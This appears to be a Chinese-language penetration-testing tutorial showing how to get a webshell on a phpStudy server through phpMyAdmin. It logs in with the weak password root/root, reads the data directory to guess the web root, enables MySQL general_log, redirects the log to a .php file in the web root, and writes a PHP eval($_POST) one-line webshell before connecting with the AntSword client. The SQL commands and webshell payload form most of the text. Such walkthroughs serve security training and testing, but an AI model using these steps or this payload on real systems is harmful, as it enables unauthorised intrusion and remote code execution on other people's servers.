当初接触渗透测试的时候getshell就会个文件上传，后来随着工作学到的知识越来越多，慢慢的getshell的姿势也慢慢的学到了些，这次给大家分享一个很常见也很基础的getshell的方式。如有什么不严谨的地方，还望大佬指点。

![](../Images/1fbb1275e5c60fabc76a0b1e199c4d95.png)![](../Images/227ab0073c9e93dd1d36a68b516b09d4.png)![](../Images/7d0d9cf31b3a92be0e7ed72a3ad6d268.png)![](../Images/85152382ebe9c0533981c871702fd5f4.png)干货分享![](../Images/78c59e552df99e3a3f5c530218deaa75.png)![](../Images/227ab0073c9e93dd1d36a68b516b09d4.png)![](../Images/7d0d9cf31b3a92be0e7ed72a3ad6d268.png)1准备环境

        一台装有Phpstudy（mysql>5.0）的服务器

        中国蚁剑（公众号回复“蚁剑”获取）

2实施方式

1.  开启phpstudy
    

![](../Images/e6c727deed926b6a8202d06f1c2367f7.png)

2.访问服务器phpmyadmin页面

![](../Images/493e5c1051decfc0ed4345745ccd737b.png)

3.弱口令root root登录进去，点击SQL，执行sql语句

![](../Images/f65ce86b409c7d541dfdc53270c2f682.png)

4.查看数据库存放路径，然后根据数据库存放路径猜测网站的绝对路径。

select @@datadir;

![](../Images/33937a679b518405dd27d01b4f613b8a.png)

这时我们可以看到数据库的路径为“C:\\phpStudy\\MySQL\\data\\”，由此我们可以推断网站的绝对路径为“C:\\phpStudy\\WWW\\”

5.查看日志是否开启

show variables like '%general%';

![](../Images/806ce212a476ba92eb0fbcb608304741.png)

此刻我们可以看到日志是关闭状态的，路径为C:\\phpStudy\\WWW\\general\_log\_file。  

6.手动开启日志

SET GLOBAL general\_log='on';

![](../Images/68e71d4db489702e8d66e6b8cdd4d07e.png)

![](../Images/ad39bb97f745e02c7c8ed0693c487a3e.png)

7.修改日志路径

set global general\_log\_file=

'C:\\\\phpStudy\\\\WWW\\\\moco.php';

![](../Images/096b3468b684f3a713d40cedd4a8e357.png)

注意：这里一定要用\\\\，或者使用/，不能使用\\。

8.写入shell

select "<?php eval($\_POST\['moco'\]);?>";

![](../Images/6140288621381349ab89e989c31b9e21.png)

9.这时我们就可以通过蚁剑连接getshell了。

![](../Images/12a3674c90eb0f722674638943ff1aac.png)

![](../Images/8a0b733d81076807023f768d65397fd9.png)
